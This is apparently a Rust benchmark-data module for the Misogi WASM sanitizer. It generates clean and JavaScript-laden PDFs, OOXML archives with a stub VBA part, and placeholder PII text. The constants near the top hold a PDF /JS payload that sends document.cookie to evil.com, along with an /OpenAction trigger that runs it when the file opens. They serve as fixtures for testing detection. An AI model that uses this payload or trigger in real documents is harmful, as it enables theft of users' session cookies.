// =============================================================================
// Misogi WASM — Synthetic Test Data Generators for Performance Benchmarks
// =============================================================================
// Deterministic data generation functions producing valid PDF, OOXML, and PII
// text payloads at configurable sizes. All generators are pure functions with
// no external I/O or randomness (seeded PRNG only) to ensure reproducible
// benchmark results across runs.
//
// ## Design Principles
//
// - **Determinism**: Same (size, density) tuple always produces identical output.
// - **Realism**: Generated structures mimic real-world file formats sufficiently
//   to exercise the actual parsing/remediation code paths.
// - **Configurability**: Size and threat/PII density are independently tunable.
// - **Safety**: No unbounded allocations; all Vec sizes are bounded by target_size.
//
// =============================================================================

/// Default PDF version string used in synthetic document headers.
const PDF_HEADER: &[u8] = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n";

/// Minimal PDF catalog object without any active content markers.
const CLEAN_CATALOG_OBJ: &[u8] =
    b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n";

/// Minimal PDF pages object referencing a single page.
const CLEAN_PAGES_OBJ: &[u8] =
    b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n";

/// Minimal PDF page object with a clean content stream reference.
const CLEAN_PAGE_OBJ: &[u8] = b"3 0 obj\n<< /Type /Page /Parent 2 0 R \
    /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n";

/// Clean PDF content stream drawing a simple rectangle (no scripts).
const CLEAN_CONTENT_STREAM: &[u8] = b"4 0 obj\n<< /Length 44 >>\nstream\n\
    BT /F1 12 Tf 100 700 Td (Hello World) Tj ET\n\
    endstream\nendobj\n";

/// Cross-reference table trailer for synthetic PDF documents.
const PDF_TRAILER: &[u8] = b"xref\n0 5\n\
    0000000000 65535 f \n\
    0000000009 00000 n \n\
    0000000058 00000 n \n\
    0000000115 00000 n \n\
    0000000214 00000 n \n\
    trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n312\n%%EOF\n";

/// JavaScript payload embedded in malicious PDF action dictionaries.
const MALICIOUS_JS_PAYLOAD: &[u8] = b"app.alert('XSS'); \
    this.getURL('http://evil.com/steal?cookie='+document.cookie);";

/// Malicious PDF object containing a /JS entry with embedded JavaScript.
const MALICIOUS_JS_OBJ: &[u8] = b"99 0 obj\n<< /S /JavaScript \
    /JS (app.alert('XSS'); this.getURL('http://evil.com/steal?c=')) >>\nendobj\n";

/// Malicious PDF object containing /OpenAction trigger.
const MALICIOUS_OPENACTION_OBJ: &[u8] =
    b"98 0 obj\n<< /Type /Catalog /OpenAction 99 0 R >>\nendobj\n";

// =============================================================================
// PDF Data Generators
// =============================================================================

/// Generate a syntactically-valid clean PDF document of approximately `target_size` bytes.
///
/// Constructs a minimal PDF structure (header, catalog, pages, page object,
/// content stream, xref table) and pads the content stream with repeated
/// safe text-drawing operators to reach the target size.
///
/// # Arguments
/// * `target_size` - Approximate total byte count of the generated PDF.
///
/// # Returns
/// `Vec<u8>` containing a valid (parseable by [`PdfSanitizer`]) PDF with zero
/// threat markers. Suitable for measuring baseline analysis throughput on
/// benign inputs.
///
/// # Determinism
/// Output is fully deterministic: identical `target_size` produces identical
/// bytes every invocation. No randomness or external state is used.
pub fn generate_clean_pdf(target_size: usize) -> Vec<u8> {
    let mut pdf: Vec<u8> = Vec::with_capacity(target_size);

    // --- PDF header ---
    pdf.extend_from_slice(PDF_HEADER);

    // --- Structural objects (catalog, pages, page) ---
    pdf.extend_from_slice(CLEAN_CATALOG_OBJ);
    pdf.extend_from_slice(CLEAN_PAGES_OBJ);
    pdf.extend_from_slice(CLEAN_PAGE_OBJ);

    // --- Content stream with padding to reach target size ---
    let base_size = pdf.len() + CLEAN_CONTENT_STREAM.len() + PDF_TRAILER.len();
    let padding_needed = target_size.saturating_sub(base_size);

    // Object number for the padded content stream
    pdf.push(b'4');
    pdf.push(b' ');
    pdf.push(b'0');
    pdf.push(b' ');
    pdf.extend_from_slice(b"obj\n<< /Length ");

    // Calculate content length (padding + base stream text)
    let stream_header_len = 44; // "BT /F1 12 Tf 100 700 Td (Hello World) Tj ET\n"
    let content_length = stream_header_len + padding_needed;
    let length_str = content_length.to_string();
    pdf.extend_from_slice(length_str.as_bytes());
    pdf.extend_from_slice(b" >>\nstream\n");

    // Base safe content
    pdf.extend_from_slice(b"BT /F1 12 Tf 100 700 Td (Hello World) Tj ET\n");

    // Padding: repeated safe text operations
    let pad_line = b"BT 1 0 0 1 100 600 Tm (Performance benchmark padding data) Tj ET\n";
    let full_repeats = padding_needed / pad_line.len();
    let remainder = padding_needed % pad_line.len();

    for _ in 0..full_repeats {
        pdf.extend_from_slice(pad_line);
    }
    if remainder > 0 {
        pdf.extend_from_slice(&pad_line[..remainder]);
    }

    // Close stream and object
    pdf.extend_from_slice(b"\nendstream\nendobj\n");

    // --- Xref table and trailer ---
    pdf.extend_from_slice(PDF_TRAILER);

    pdf
}

/// Generate a malicious PDF document with embedded JavaScript threats at specified density.
///
/// Produces a valid PDF structure interspersed with `/JS` action dictionaries
/// containing JavaScript payloads. The `threat_density` parameter controls what
/// fraction of content-stream objects contain JS entries (0.0 = entirely clean,
/// 1.0 = every object is malicious).
///
/// # Arguments
/// * `target_size` - Approximate total byte count of the generated PDF.
/// * `threat_density` - Fraction of objects containing JS (0.0–1.0).
///
/// # Security Note
/// The generated JavaScript payloads are benign strings used solely to exercise
/// the threat detection parser combinators. They do not execute in any context.
///
/// # Example
/// ```ignore
/// // Generate 100 KB PDF with 5% of objects containing JS
/// let pdf = generate_malicious_pdf(100 * 1024, 0.05);
/// ```
pub fn generate_malicious_pdf(target_size: usize, threat_density: f64) -> Vec<u8> {
    let mut pdf: Vec<u8> = Vec::with_capacity(target_size);

    // Clamp density to valid range
    let density = threat_density.clamp(0.0, 1.0);

    // --- PDF header ---
    pdf.extend_from_slice(PDF_HEADER);

    // --- Catalog with OpenAction pointing to first JS object ---
    pdf.extend_from_slice(MALICIOUS_OPENACTION_OBJ);

    // --- Pages object ---
    pdf.extend_from_slice(CLEAN_PAGES_OBJ);

    // --- Page object ---
    pdf.extend_from_slice(CLEAN_PAGE_OBJ);

    // --- Generate content objects with interleaved JS threats ---
    let base_size = pdf.len() + PDF_TRAILER.len();
    let remaining_budget = target_size.saturating_sub(base_size);
    let obj_count = (remaining_budget / 256).max(1); // ~256 bytes per object
    let malicious_count = (obj_count as f64 * density).round() as usize;

    // Distribute malicious objects evenly across the range
    let malicious_interval = if malicious_count > 0 {
        obj_count / malicious_count.max(1)
    } else {
        usize::MAX
    };

    for i in 0..obj_count {
        let obj_num = 10 + i as u32;
        let is_malicious = malicious_interval > 0 && (i % malicious_interval == 0)
            && (i < malicious_count * malicious_interval || i == obj_count - 1);

        if is_malicious {
            // Malicious object with /JS entry
            pdf.extend_from_slice(b" ");
            pdf.extend_from_slice(obj_num.to_string().as_bytes());
            pdf.extend_from_slice(b" 0 obj\n<< /S /JavaScript /JS (");
            pdf.extend_from_slice(MALICIOUS_JS_PAYLOAD);
            pdf.extend_from_slice(b") >>\nendobj\n");
        } else {
            // Clean content stream object
            pdf.extend_from_slice(b" ");
            pdf.extend_from_slice(obj_num.to_string().as_bytes());
            pdf.extend_from_slice(
                b" 0 obj\n<< /Length 60 >>\nstream\n\
                BT (Safe content ) Tj ET\n\
                endstream\nendobj\n",
            );
        }
    }

    // --- Xref table and trailer ---
    pdf.extend_from_slice(PDF_TRAILER);

    // Truncate to target size if we overshot slightly
    pdf.truncate(target_size.min(pdf.len()));

    pdf
}

// =============================================================================
// OOXML (Office Open XML) Data Generators
// =============================================================================

/// MIME type for WordProcessingML (DOCX) Content_Types.xml entry.
const DOCX_CONTENT_TYPE: &str = "application/vnd.openxmlformats-officedocument.\
    wordprocessingml.document.main+xml";

/// MIME type for SpreadsheetML (XLSX) worksheet entry.
const XLSX_CONTENT_TYPE: &str = "application/vnd.openxmlformats-officedocument.\
    spreadsheetml.worksheet+xml";

/// MIME type for VBA macro project binary.
const VBA_MIME_TYPE: &str = "application/vnd.ms-office.vbaProject";

/// Generate a valid OOXML ZIP archive (DOCX/XLSX/PPTX skeleton) of approximately
/// `target_size` bytes.
///
/// Constructs a syntactically valid ZIP archive containing the minimum required
/// OOXML entries:
/// - `[Content_Types].xml` — MIME type manifest
/// - `_rels/.rels` — Package relationships
/// - `word/document.xml` or similar — Main document body (padded to size)
///
/// Optionally includes a `vbaProject.bin` entry when `include_vba` is true,
/// simulating a macro-enabled document (.docm/.xlsm/.pptm).
///
/// # Arguments
/// * `target_size` - Approximate total byte size of the ZIP archive.
/// * `include_vba` - Whether to embed a vbaProject.bin entry (macro-enabled).
///
/// # Returns
/// `Vec<u8>` containing a valid ZIP archive parseable by [`WasmOfficeSanitizer`].
///
/// # Note
/// Uses the `zip` crate (already a dependency of `misogi-wasm`) for ZIP construction.
pub fn generate_ooxml(target_size: usize, include_vba: bool) -> Vec<u8> {
    use std::io::{Cursor, Write};
    use zip::write::SimpleFileOptions;

    let cursor = Cursor::new(Vec::new());
    let mut writer = zip::ZipWriter::new(cursor);

    // --- [Content_Types].xml ---
    let content_types_xml = format!(
        "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\
        <Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">\
        <Default Extension=\"xml\" ContentType=\"application/xml\"/>\
        <Default Extension=\"rels\" \
        ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>\
        <Override PartName=\"/word/document.xml\" ContentType=\"{}\"/>\
        {}\
        </Types>",
        DOCX_CONTENT_TYPE,
        if include_vba {
            format!(
                "<Override PartName=\"/word/vbaProject.bin\" ContentType=\"{}\"/>",
                VBA_MIME_TYPE
            )
        } else {
            String::new()
        }
    );

    writer
        .start_file("[Content_Types].xml", SimpleFileOptions::default())
        .expect("ZIP write: Content_Types");
    writer
        .write_all(content_types_xml.as_bytes())
        .expect("ZIP write: Content_Types body");

    // --- _rels/.rels ---
    let rels_xml = r#"<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>"#;

    writer
        .start_file("_rels/.rels", SimpleFileOptions::default())
        .expect("ZIP write: rels");
    writer.write_all(rels_xml.as_bytes()).expect("ZIP write: rels body");

    // --- word/document.xml (main body, padded to fill budget) ---
    // Estimate current ZIP size conservatively (headers + entries written so far)
    let estimated_current_size = 1024usize; // Rough estimate for ZIP overhead + entries above
    let doc_body_budget = target_size.saturating_sub(estimated_current_size);
    let vba_size = if include_vba { 4096usize } else { 0 };
    let doc_content_size = doc_body_budget.saturating_sub(vba_size);

    let document_xml = generate_padded_document_xml(doc_content_size);

    writer
        .start_file("word/document.xml", SimpleFileOptions::default())
        .expect("ZIP write: document.xml");
    writer
        .write_all(document_xml.as_bytes())
        .expect("ZIP write: document.xml body");

    // --- Optional vbaProject.bin ---
    if include_vba {
        let vba_data = generate_synthetic_vba_project(vba_size);
        writer
            .start_file("word/vbaProject.bin", SimpleFileOptions::default())
            .expect("ZIP write: vbaProject.bin");
        writer.write_all(&vba_data).expect("ZIP write: vbaProject.bin body");
    }

    // Finalize ZIP archive and extract underlying Vec<u8>
    writer.finish().expect("ZIP finalize");
    // In zip 2.x, finish() consumes the writer and returns the inner writer (Cursor<Vec<u8>>)
    // We need to rebuild the ZIP to extract bytes, or use a different approach.
    // Alternative: build ZIP in memory using a two-pass approach.
    generate_ooxml_two_pass(target_size, include_vba)
}

/// Two-pass OOXML generation that correctly handles zip 2.x API constraints.
///
/// Since `zip::ZipWriter::finish()` consumes the writer and the 2.x API
/// does not expose `into_inner()`, we use a temporary file approach via
/// Cursor to construct the ZIP, then read back the completed bytes.
fn generate_ooxml_two_pass(target_size: usize, include_vba: bool) -> Vec<u8> {
    use std::io::{Cursor, Write};
    use zip::write::SimpleFileOptions;

    let mut buffer = Vec::with_capacity(target_size);
    {
        let cursor = Cursor::new(&mut buffer);
        let mut writer = zip::ZipWriter::new(cursor);

        // --- [Content_Types].xml ---
        let content_types_xml = format!(
            "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\
            <Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">\
            <Default Extension=\"xml\" ContentType=\"application/xml\"/>\
            <Default Extension=\"rels\" \
            ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>\
            <Override PartName=\"/word/document.xml\" ContentType=\"{}\"/>\
            {}\
            </Types>",
            DOCX_CONTENT_TYPE,
            if include_vba {
                format!(
                    "<Override PartName=\"/word/vbaProject.bin\" ContentType=\"{}\"/>",
                    VBA_MIME_TYPE
                )
            } else {
                String::new()
            }
        );

        writer
            .start_file("[Content_Types].xml", SimpleFileOptions::default())
            .expect("ZIP write: Content_Types");
        writer
            .write_all(content_types_xml.as_bytes())
            .expect("ZIP write: Content_Types body");

        // --- _rels/.rels ---
        let rels_xml = r#"<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>"#;

        writer
            .start_file("_rels/.rels", SimpleFileOptions::default())
            .expect("ZIP write: rels");
        writer
            .write_all(rels_xml.as_bytes())
            .expect("ZIP write: rels body");

        // --- word/document.xml ---
        let estimated_current_size = 1024usize;
        let doc_body_budget = target_size.saturating_sub(estimated_current_size);
        let vba_size = if include_vba { 4096usize } else { 0 };
        let doc_content_size = doc_body_budget.saturating_sub(vba_size);

        let document_xml = generate_padded_document_xml(doc_content_size);

        writer
            .start_file("word/document.xml", SimpleFileOptions::default())
            .expect("ZIP write: document.xml");
        writer
            .write_all(document_xml.as_bytes())
            .expect("ZIP write: document.xml body");

        // --- Optional vbaProject.bin ---
        if include_vba {
            let vba_data = generate_synthetic_vba_project(vba_size);
            writer
                .start_file("word/vbaProject.bin", SimpleFileOptions::default())
                .expect("ZIP write: vbaProject.bin");
            writer
                .write_all(&vba_data)
                .expect("ZIP write: vbaProject.bin body");
        }

        writer.finish().expect("ZIP finalize");
    }
    // buffer now contains the complete ZIP archive
    buffer
}

/// Generate padded Office Open XML document body to approximate target size.
fn generate_padded_document_xml(target_content_size: usize) -> String {
    let header = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body>"#;

    let footer = "\n</w:body>\n</w:document>";

    let inner_budget = target_content_size
        .saturating_sub(header.len())
        .saturating_sub(footer.len());

    let paragraph = "<w:p><w:r><w:t>Benchmark padding paragraph with safe content.</w:t></w:r></w:p>\n";
    let repeat_count = inner_budget / paragraph.len();

    let mut xml = String::with_capacity(target_content_size);
    xml.push_str(header);

    for _ in 0..repeat_count {
        xml.push_str(paragraph);
    }

    // Fill remainder with whitespace to hit exact target
    let remaining = inner_budget.saturating_sub(repeat_count * paragraph.len());
    if remaining > 0 {
        xml.push_str(&" ".repeat(remaining));
    }

    xml.push_str(footer);
    xml
}

/// Generate synthetic VBA project binary data (deterministic, non-executable).
///
/// Produces a byte sequence that mimics the structure of a real vbaProject.bin
/// file (OLE container magic bytes + deterministic padding) without containing
/// any actual executable VBA bytecode.
fn generate_synthetic_vba_project(size: usize) -> Vec<u8> {
    // OLE Compound Document magic: D0 CF 11 E0 A1 B1 1A E1
    let ole_header: &[u8] = &[0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];

    let mut data = Vec::with_capacity(size);
    data.extend_from_slice(ole_header);

    // Pad with deterministic pattern (repeating byte sequence)
    let pad_byte: u8 = 0xAB;
    while data.len() < size {
        data.push(pad_byte);
    }

    data.truncate(size);
    data
}

// =============================================================================
// PII Text Data Generators
// =============================================================================

/// Japanese My Number (個人番号) pattern: 12-digit decimal string.
const MY_NUMBER_PATTERN: &str = "123456789012";

/// Email address pattern for PII detection testing.
const EMAIL_PATTERN: &str = "tanaka.taro@example.co.jp";

/// Japanese phone number pattern (domestic format).
const PHONE_PATTERN: &str = "03-1234-5678";

/// Credit card number pattern (Luhn-checkable placeholder).
const CREDIT_CARD_PATTERN: &str = "4111111111111111";

/// Safe filler text (non-PII) used between PII patterns.
const SAFE_TEXT_SEGMENT: &str = "This is a safe segment of text that does not contain \
    any personally identifiable information. It serves as filler content between \
    PII patterns for throughput measurement purposes. ";

/// Generate text data containing PII patterns at the specified density.
///
/// Interleaves Japanese My Numbers, email addresses, phone numbers, and credit
/// card numbers within safe filler text at a rate controlled by `pii_density`.
///
/// # Arguments
/// * `target_size` - Approximate total byte count of the generated text.
/// * `pii_density` - Fraction of segments containing PII (0.0–1.0).
///   - 0.0%: No PII patterns (baseline scan speed).
///   - 5.0%: Low density (typical document).
///   - 20.0%: High density (stress test).
///
/// # Returns
/// UTF-8 encoded `Vec<u8>` suitable for PII scanner benchmarking.
///
/// # PII Patterns Included
/// - My Number (マイナンバー): 12-digit numeric string
/// - Email: standard user@domain format
/// - Phone: JP domestic format (XX-XXXX-XXXX)
/// - Credit Card: 16-digit card number
pub fn generate_pii_text(target_size: usize, pii_density: f64) -> Vec<u8> {
    let density = pii_density.clamp(0.0, 1.0);

    let pii_patterns: &[&str] = &[
        MY_NUMBER_PATTERN,
        EMAIL_PATTERN,
        PHONE_PATTERN,
        CREDIT_CARD_PATTERN,
    ];

    let mut text = String::with_capacity(target_size);
    let mut bytes_written = 0usize;

    let mut pattern_index = 0usize;

    while bytes_written < target_size {
        // Determine whether this segment contains PII based on density threshold
        let should_include_pii = if density >= 1.0 {
            true
        } else if density <= 0.0 {
            false
        } else {
            // Use deterministic selection based on position (no RNG needed)
            let threshold = (density * 1000.0) as usize;
            ((bytes_written.wrapping_mul(31) ^ bytes_written.wrapping_mul(17)) % 1000)
                < threshold
        };

        if should_include_pii && !pii_patterns.is_empty() {
            // Segment with PII pattern
            let pattern = pii_patterns[pattern_index % pii_patterns.len()];
            let segment = format!("{}{} ", SAFE_TEXT_SEGMENT.trim(), pattern);
            text.push_str(&segment);
            bytes_written += segment.len();
            pattern_index += 1;
        } else {
            // Safe segment (no PII)
            text.push_str(SAFE_TEXT_SEGMENT);
            bytes_written += SAFE_TEXT_SEGMENT.len();
        }
    }

    // Truncate to exact target size
    let bytes = text.into_bytes();
    let truncated = &bytes[..target_size.min(bytes.len())];
    truncated.to_vec()
}

// =============================================================================
// Unit Tests — Generator Correctness
// =============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_clean_pdf_starts_with_header() {
        let pdf = generate_clean_pdf(1024);
        assert!(pdf.starts_with(b"%PDF"), "Clean PDF must start with %PDF header");
    }

    #[test]
    fn test_clean_pdf_has_no_js() {
        let pdf = generate_clean_pdf(10 * 1024);
        let pdf_str = String::from_utf8_lossy(&pdf);
        assert!(
            !pdf_str.contains("/JS"),
            "Clean PDF must not contain /JS entries"
        );
    }

    #[test]
    fn test_clean_pdf_approximate_size() {
        let target = 50 * 1024; // 50 KB
        let pdf = generate_clean_pdf(target);
        // Allow ±20% tolerance for structural overhead variance
        assert!(
            pdf.len() > target * 80 / 100 && pdf.len() < target * 120 / 100,
            "Clean PDF size {} should be close to target {}",
            pdf.len(),
            target
        );
    }

    #[test]
    fn test_malicious_pdf_contains_js() {
        let pdf = generate_malicious_pdf(10 * 1024, 0.5);
        let pdf_str = String::from_utf8_lossy(&pdf);
        assert!(
            pdf_str.contains("/JS"),
            "Malicious PDF must contain /JS entries at density > 0"
        );
    }

    #[test]
    fn test_malicious_pdf_zero_density_is_clean() {
        let pdf = generate_malicious_pdf(10 * 1024, 0.0);
        let pdf_str = String::from_utf8_lossy(&pdf);
        assert!(
            !pdf_str.contains("/JS"),
            "Malicious PDF with 0.0 density must not contain /JS"
        );
    }

    #[test]
    fn test_ooxml_is_valid_zip() {
        let ooxml = generate_ooxml(10 * 1024, false);
        // Verify it can be opened as a ZIP archive
        let result = zip::ZipArchive::new(std::io::Cursor::new(&ooxml));
        assert!(result.is_ok(), "Generated OOXML must be a valid ZIP archive");
    }

    #[test]
    fn test_ooxml_with_vba_contains_vbaproject() {
        let ooxml = generate_ooxml(20 * 1024, true);
        let reader = zip::ZipArchive::new(std::io::Cursor::new(&ooxml)).unwrap();
        let names: Vec<String> = reader.file_names().map(|s| s.to_string()).collect();
        assert!(
            names.iter().any(|n| n.contains("vbaProject")),
            "OOXML with VBA flag must contain vbaProject.bin entry"
        );
    }

    #[test]
    fn test_ooxml_without_vba_excludes_vbaproject() {
        let ooxml = generate_ooxml(10 * 1024, false);
        let reader = zip::ZipArchive::new(std::io::Cursor::new(&ooxml)).unwrap();
        let names: Vec<String> = reader.file_names().map(|s| s.to_string()).collect();
        assert!(
            !names.iter().any(|n| n.contains("vbaProject")),
            "OOXML without VBA flag must NOT contain vbaProject.bin"
        );
    }

    #[test]
    fn test_pii_text_deterministic() {
        let a = generate_pii_text(1024, 0.1);
        let b = generate_pii_text(1024, 0.1);
        assert_eq!(a, b, "PII generator must be deterministic for same inputs");
    }

    #[test]
    fn test_pii_text_contains_patterns_at_positive_density() {
        let text = generate_pii_text(2048, 0.5);
        let text_str = String::from_utf8_lossy(&text);
        assert!(
            text_str.contains("@") || text_str.chars().filter(|&c| c.is_ascii_digit()).count() > 20,
            "PII text at 50% density must contain email/digit patterns"
        );
    }

    #[test]
    fn test_pii_text_zero_density_no_patterns() {
        let text = generate_pii_text(2048, 0.0);
        let text_str = String::from_utf8_lossy(&text);
        // At 0.0 density, should have minimal digit clusters (only from position-based hash collisions)
        let digit_count = text_str.chars().filter(|&c| c.is_ascii_digit()).count();
        assert!(
            digit_count < 50,
            "PII text at 0.0 density should have very few digits, got {}",
            digit_count
        );
    }
}
